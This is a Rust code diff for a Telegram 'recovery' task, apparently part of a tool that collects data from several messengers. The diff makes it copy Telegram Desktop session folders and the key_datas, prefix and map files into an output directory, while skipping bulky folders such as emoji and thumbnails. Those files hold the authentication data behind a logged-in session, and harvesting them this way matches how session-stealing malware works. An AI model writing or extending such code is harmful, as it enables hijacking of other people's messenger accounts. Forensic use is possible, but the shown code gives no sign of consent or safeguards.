@@ -229,29 +229,45 @@ impl RecoveryTask for TelegramTask {
         ];
 
         let dest_root = messenger_output_dir(ctx, &self.label()).await?;
+        let map_regex = Regex::new(r"^map[0-9]+$").unwrap();
+        let session_folder_regex = Regex::new(r"^[A-F0-9]{16}$").unwrap();
+
+        let excluded_folders = ["user_data", "emoji", "temp", "dumps", "working", "thumbnails"];
 
         for root in &roots {
             if let Ok(mut dir) = fs::read_dir(root).await {
                 while let Some(entry) = dir.next_entry().await? {
                     let file_name = entry.file_name();
                     let name = file_name.to_string_lossy();
+                    let is_file = entry.file_type().await?.is_file();
+                    let is_dir = entry.file_type().await?.is_dir();
 
-                    if entry.file_type().await?.is_dir() && name.len() == 16 {
-                        copy_named_dir(
-                            &self.label(),
-                            &entry.path(),
-                            &dest_root.join(name.to_string()),
-                            &mut artifacts,
-                        )
-                        .await?;
-                    } else if entry.file_type().await?.is_file() && name.len() == 17 {
-                        copy_named_file(
-                            &self.label(),
-                            &entry.path(),
-                            &dest_root.join("files"),
-                            &mut artifacts,
-                        )
-                        .await?;
+                    if is_dir {
+                        if session_folder_regex.is_match(&name) {
+                            // Copy session folder but exclude large junk
+                            copy_telegram_session_dir(
+                                &self.label(),
+                                &entry.path(),
+                                &dest_root.join(name.to_string()),
+                                &excluded_folders,
+                                &mut artifacts,
+                            ).await?;
+                        }
+                    } else if is_file {
+                        let should_copy = name.len() == 17 
+                            || name == "key_datas" 
+                            || name == "prefix"
+                            || map_regex.is_match(&name);
+
+                        if should_copy {
+                             copy_named_file(
+                                &self.label(),
+                                &entry.path(),
+                                &dest_root,
+                                &mut artifacts,
+                            )
+                            .await?;
+                        }
                     }
                 }
             }
@@ -259,6 +275,40 @@ impl RecoveryTask for TelegramTask {
 
         Ok(artifacts)
     }
+}
+
+async fn copy_telegram_session_dir(
+    label: &str,
+    src: &Path,
+    dst: &Path,
+    excluded: &[&str],
+    artifacts: &mut Vec<RecoveryArtifact>,
+) -> Result<(), RecoveryError> {
+    fs::create_dir_all(dst).await?;
+    let mut dir = fs::read_dir(src).await?;
+    while let Some(entry) = dir.next_entry().await? {
+        let fname = entry.file_name().to_string_lossy().to_string();
+        if excluded.iter().any(|&ex| fname.eq_ignore_ascii_case(ex)) {
+            continue;
+        }
+
+        let path = entry.path();
+        if entry.file_type().await?.is_dir() {
+            copy_dir_limited(&path, &dst.join(&fname), label, artifacts, 2, 100).await?;
+        } else {
+            let target = dst.join(&fname);
+            if let Ok(_) = fs::copy(&path, &target).await {
+                let meta = fs::metadata(&target).await?;
+                artifacts.push(RecoveryArtifact {
+                    label: label.to_string(),
+                    path: target,
+                    size_bytes: meta.len(),
+                    modified: meta.modified().ok(),
+                });
+            }
+        }
+    }
+    Ok(())
 }
 
 struct ToxTask;
